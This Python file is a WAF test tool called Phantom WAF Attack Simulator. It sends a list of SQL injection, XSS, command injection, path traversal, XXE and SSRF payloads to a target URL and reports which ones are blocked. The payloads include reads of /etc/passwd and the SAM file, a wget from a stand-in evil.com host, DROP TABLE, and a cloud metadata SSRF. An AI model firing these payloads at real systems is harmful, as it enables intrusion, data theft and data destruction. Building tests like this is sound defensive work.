"""
Attack Simulator - Test Phantom WAF Protection
Simulates various attack vectors to test WAF effectiveness
"""
import requests
import json
import time
from typing import Dict, List
import argparse
from colorama import init, Fore, Style

# Initialize colorama for colored output
init(autoreset=True)


class AttackSimulator:
    """Simulate various web attacks to test WAF"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
        # Attack payloads
        self.payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "1' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "1; DROP TABLE users--",
                "1' AND 1=1--",
                "' OR 1=1#",
                "1' WAITFOR DELAY '00:00:05'--",
                "1' AND SLEEP(5)--",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src='javascript:alert(1)'>",
                "<body onload=alert('XSS')>",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "$(cat /etc/passwd)",
                "`cat /etc/passwd`",
                "; wget http://evil.com/shell.sh",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.server/secret">]>',
            ],
            'ssrf': [
                "http://localhost/admin",
                "http://127.0.0.1:8080",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "gopher://localhost:25/",
            ]
        }
    
    def test_attack(self, attack_type: str, payload: str, endpoint: str = '/api/test') -> Dict:
        """Test a single attack payload"""
        url = f"{self.target_url}{endpoint}"
        
        try:
            # Try as query parameter
            response = self.session.get(url, params={'input': payload}, timeout=5)
            
            result = {
                'attack_type': attack_type,
                'payload': payload[:50] + '...' if len(payload) > 50 else payload,
                'status_code': response.status_code,
                'blocked': response.status_code == 403,
                'response_time': response.elapsed.total_seconds()
            }
            
            if response.status_code == 403:
                try:
                    error_data = response.json()
                    result['blocked_by'] = error_data.get('blocked_by', 'unknown')
                    result['threat_score'] = error_data.get('threat_score', 0)
                except:
                    pass
            
            return result
        
        except requests.exceptions.Timeout:
            return {
                'attack_type': attack_type,
                'payload': payload[:50],
                'status_code': 0,
                'blocked': False,
                'error': 'Timeout'
            }
        except Exception as e:
            return {
                'attack_type': attack_type,
                'payload': payload[:50],
                'status_code': 0,
                'blocked': False,
                'error': str(e)
            }
    
    def run_all_tests(self) -> Dict:
        """Run all attack tests"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}🎯  PHANTOM WAF ATTACK SIMULATOR")
        print(f"{Fore.CYAN}{'='*80}\n")
        print(f"{Fore.YELLOW}Target: {self.target_url}\n")
        
        results = {
            'total_attacks': 0,
            'blocked': 0,
            'allowed': 0,
            'errors': 0,
            'by_type': {}
        }
        
        for attack_type, payloads in self.payloads.items():
            print(f"\n{Fore.MAGENTA}{'─'*80}")
            print(f"{Fore.MAGENTA}Testing: {attack_type.upper().replace('_', ' ')}")
            print(f"{Fore.MAGENTA}{'─'*80}\n")
            
            type_results = {
                'total': len(payloads),
                'blocked': 0,
                'allowed': 0,
                'errors': 0
            }
            
            for i, payload in enumerate(payloads, 1):
                result = self.test_attack(attack_type, payload)
                results['total_attacks'] += 1
                
                if 'error' in result:
                    status_icon = f"{Fore.YELLOW}⚠️"
                    status_text = f"{Fore.YELLOW}ERROR"
                    results['errors'] += 1
                    type_results['errors'] += 1
                elif result['blocked']:
                    status_icon = f"{Fore.GREEN}🛡️"
                    status_text = f"{Fore.GREEN}BLOCKED"
                    results['blocked'] += 1
                    type_results['blocked'] += 1
                else:
                    status_icon = f"{Fore.RED}❌"
                    status_text = f"{Fore.RED}ALLOWED"
                    results['allowed'] += 1
                    type_results['allowed'] += 1
                
                print(f"{status_icon} [{i}/{len(payloads)}] {status_text} - "
                      f"{Fore.WHITE}{result['payload']}")
                
                if result.get('blocked'):
                    print(f"   {Fore.CYAN}└─ Blocked by: {result.get('blocked_by', 'unknown')} "
                          f"(Score: {result.get('threat_score', 0)})")
                
                time.sleep(0.1)  # Small delay between requests
            
            results['by_type'][attack_type] = type_results
        
        # Print summary
        self._print_summary(results)
        
        return results
    
    def test_specific_type(self, attack_type: str):
        """Test specific attack type"""
        if attack_type not in self.payloads:
            print(f"{Fore.RED}Unknown attack type: {attack_type}")
            print(f"{Fore.YELLOW}Available types: {', '.join(self.payloads.keys())}")
            return
        
        print(f"\n{Fore.CYAN}Testing {attack_type.replace('_', ' ').title()} attacks...\n")
        
        blocked = 0
        total = len(self.payloads[attack_type])
        
        for payload in self.payloads[attack_type]:
            result = self.test_attack(attack_type, payload)
            if result['blocked']:
                blocked += 1
                print(f"{Fore.GREEN}✓ BLOCKED: {result['payload']}")
            else:
                print(f"{Fore.RED}✗ ALLOWED: {result['payload']}")
        
        print(f"\n{Fore.CYAN}Results: {blocked}/{total} blocked ({(blocked/total*100):.1f}%)")
    
    def _print_summary(self, results: Dict):
        """Print test summary"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.CYAN}📊  TEST SUMMARY")
        print(f"{Fore.CYAN}{'='*80}\n")
        
        total = results['total_attacks']
        blocked = results['blocked']
        allowed = results['allowed']
        errors = results['errors']
        
        block_rate = (blocked / total * 100) if total > 0 else 0
        
        print(f"{Fore.WHITE}Total Attacks:  {total}")
        print(f"{Fore.GREEN}Blocked:        {blocked} ({block_rate:.1f}%)")
        print(f"{Fore.RED}Allowed:        {allowed} ({(allowed/total*100):.1f}%)" if allowed > 0 else f"{Fore.RED}Allowed:        {allowed}")
        print(f"{Fore.YELLOW}Errors:         {errors}")
        
        print(f"\n{Fore.CYAN}By Attack Type:")
        for attack_type, type_results in results['by_type'].items():
            total_type = type_results['total']
            blocked_type = type_results['blocked']
            rate = (blocked_type / total_type * 100) if total_type > 0 else 0
            
            print(f"  {Fore.WHITE}{attack_type:20s} {blocked_type}/{total_type} blocked ({rate:.0f}%)")
        
        print(f"\n{Fore.CYAN}{'='*80}\n")
        
        if block_rate >= 90:
            print(f"{Fore.GREEN}✅ EXCELLENT! WAF is blocking {block_rate:.1f}% of attacks!")
        elif block_rate >= 70:
            print(f"{Fore.YELLOW}⚠️  GOOD! WAF is blocking {block_rate:.1f}% of attacks, but could be improved.")
        else:
            print(f"{Fore.RED}❌ WARNING! Only {block_rate:.1f}% of attacks were blocked!")


def main():
    parser = argparse.ArgumentParser(description='Phantom WAF Attack Simulator')
    parser.add_argument('--target', default='http://localhost:5000',
                       help='Target URL (default: http://localhost:5000)')
    parser.add_argument('--attack-type', choices=['sql_injection', 'xss', 'command_injection',
                                                    'path_traversal', 'xxe', 'ssrf'],
                       help='Test specific attack type')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(args.target)
    
    if args.attack_type:
        simulator.test_specific_type(args.attack_type)
    else:
        simulator.run_all_tests()


if __name__ == '__main__':
    main()
